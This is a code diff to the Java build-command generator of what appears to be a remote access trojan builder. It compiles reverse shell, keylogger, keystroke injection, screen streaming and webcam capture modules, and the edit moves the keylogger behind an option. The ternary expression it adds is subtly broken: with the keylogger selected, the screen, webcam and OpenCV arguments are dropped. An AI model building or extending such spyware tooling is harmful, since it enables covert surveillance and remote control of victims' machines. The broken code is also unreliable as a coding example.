@@ -70,7 +70,6 @@ public class Compiler implements ActionListener {
                     "information/network/NetworkInformation.cpp " +
                     "reverse_shell/ReverseShell.cpp " +
                     "keyboard/KeyboardExecuter.cpp " +
-                    "keylogger/KeyLogger.cpp " +
                     "permission/Permission.cpp " +
                     "box_message/MessageBoxGUI.cpp " +
                     "state/SystemState.cpp " +
@@ -88,17 +87,17 @@ public class Compiler implements ActionListener {
             if (checkBoxes[2].isSelected()) {
                 modifier.addInclude("#define WEBCAM");
                 modifier.variableModifier("WEBCAM","\""+fieldsArray[9].getText()+"\"");
-                command.append(
+                command.append(checkBoxes[3].isSelected() ? "keylogger/KeyLogger.cpp " : "" +
                         "screen/ScreenStreamer.cpp " +
-                                "webcam/WebcamManager.cpp " +
-                                " -IC:opencv_static/include -Lopencv_static/lib " +
-                                "-lopencv_gapi460 -lopencv_highgui460 " +
-                                "-lopencv_ml460 -lopencv_objdetect460 " +
-                                "-lopencv_photo460 -lopencv_stitching460 " +
-                                "-lopencv_video460 -lopencv_calib3d460 " +
-                                "-lopencv_features2d460 -lopencv_dnn460 " +
-                                "-lopencv_flann460 -lopencv_videoio460 " +
-                                "-lopencv_imgcodecs460 -lopencv_imgproc460 " +
+                        "webcam/WebcamManager.cpp " +
+                        " -IC:opencv_static/include -Lopencv_static/lib " +
+                        "-lopencv_gapi460 -lopencv_highgui460 " +
+                        "-lopencv_ml460 -lopencv_objdetect460 " +
+                        "-lopencv_photo460 -lopencv_stitching460 " +
+                        "-lopencv_video460 -lopencv_calib3d460 " +
+                        "-lopencv_features2d460 -lopencv_dnn460 " +
+                        "-lopencv_flann460 -lopencv_videoio460 " +
+                        "-lopencv_imgcodecs460 -lopencv_imgproc460 " +
                                 "-lopencv_core460 -llibprotobuf " +
                                 "-lade -llibjpeg-turbo -llibwebp " +
                                 "-llibpng -llibtiff -llibopenjp2 -lIlmImf " +
